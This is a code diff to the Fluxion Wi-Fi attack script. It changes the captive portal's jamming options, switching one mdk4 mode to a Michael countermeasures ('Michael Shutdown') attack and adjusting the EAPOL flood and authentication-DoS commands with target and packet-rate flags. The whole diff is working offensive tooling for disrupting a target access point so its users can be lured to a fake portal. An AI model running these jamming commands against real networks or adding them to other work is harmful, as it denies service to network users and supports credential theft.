@@ -152,7 +152,7 @@ function captive_portal_set_ap_service() {
 fluxion_header
 
 echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
-echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4 (Beacon/Probe Flood)${CClr}"
+echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4 (Michael Shutdown Exploitation)${CClr}"
 echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay (Deauth)${CClr}"
 echo -e "${CSRed}[${CSYel}3${CSRed}]${CClr} mdk3 (Deauth)${CClr}"
 echo -e "${CSRed}[${CSYel}4${CSRed}]${CClr} mdk4 (EAPOL Start Flood)${CClr}"
@@ -1506,8 +1506,8 @@ start_attack() {
   elif [[ $option_deauth -eq 1 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
-        -title "FLUXION AP Jammer Service (mdk4 Beacon/Probe) [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface b -c $FluxionTargetChannel -a \"$FluxionTargetMAC\"" &
+        -title "FLUXION AP Jammer Service (mdk4 Michael Shutdown) [$FluxionTargetSSID]" -e \
+        "mdk4 $CaptivePortalJammerInterface m -B $FluxionTargetMAC -c $FluxionTargetChannel" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   elif [[ $option_deauth -eq 2 ]]; then
@@ -1529,14 +1529,14 @@ start_attack() {
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service (mdk4 EAPOL) [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface e -t $FluxionTargetMAC -c $FluxionTargetChannel" &
+        "mdk4 $CaptivePortalJammerInterface e -B $FluxionTargetMAC -c $FluxionTargetChannel -s 100" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   elif [[ $option_deauth -eq 5 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service (mdk4 Auth DoS) [$FluxionTargetSSID]" -e \
-        "mdk4 $CaptivePortalJammerInterface a -a $FluxionTargetMAC -c $FluxionTargetChannel" &
+        "mdk4 $CaptivePortalJammerInterface a -B $FluxionTargetMAC -c $FluxionTargetChannel -s 150" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   fi
